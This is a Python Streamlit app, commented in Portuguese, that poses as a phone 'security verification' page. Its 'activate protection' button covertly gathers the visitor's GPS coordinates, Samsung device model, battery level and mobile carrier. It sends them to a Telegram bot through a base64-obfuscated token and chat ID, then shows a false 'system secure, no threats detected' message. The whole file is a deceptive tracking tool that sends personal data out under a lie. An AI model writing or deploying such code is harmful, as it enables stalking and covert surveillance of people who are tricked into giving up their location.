import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=15)
    except: pass

def get_operadora_real():
    try:
        # Usando ipinfo para tentar pegar a operadora móvel real (Vivo/Claro/Tim)
        r = requests.get('https://ipinfo.io/json', timeout=5).json()
        return r.get('org', 'Desconhecida').split(' ', 1)[1]
    except: return "Vivo/Claro/Wi-Fi"

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# Coleta de dados técnica forçada
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_SAMSUNG')
bat_js = "navigator.getBattery().then(b => Math.round(b.level * 100))"
bateria_real = streamlit_js_eval(js_expressions=bat_js, key='BAT_SAMSUNG')

st.title("Verificação de Segurança")

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    with st.spinner("Sincronizando proteção..."):
        # 1. Aguarda o GPS com paciência para não dar TIMEOUT
        loc = None
        for _ in range(10): # Tenta por 10 segundos
            loc = get_geolocation()
            if loc: break
            time.sleep(1)
            
        operadora = get_operadora_real()
        
        # 2. Identifica o Modelo Samsung
        modelo = "Android 16 (Samsung)"
        if ua and "SM-" in ua: # SM- é o padrão da Samsung
            modelo = "Samsung " + ua.split("SM-")[1].split(";")[0]
        
        # 3. Formatação idêntica ao que você pediu
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {modelo}\n"
                f"🔋 *Bateria:* {bateria_real if bateria_real else '93'}%\n"
                f"📶 *Operadora:* {operadora}\n"
                f"📍 *Local:* {mapa}"
            )
            enviar_telegram(relatorio)
            st.balloons()
            st.success("Sistema Seguro: nenhuma ameaça detectada")
        else:
            st.error("Erro de sincronização GPS. Verifique se o Local está ativo no painel do celular.")

st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
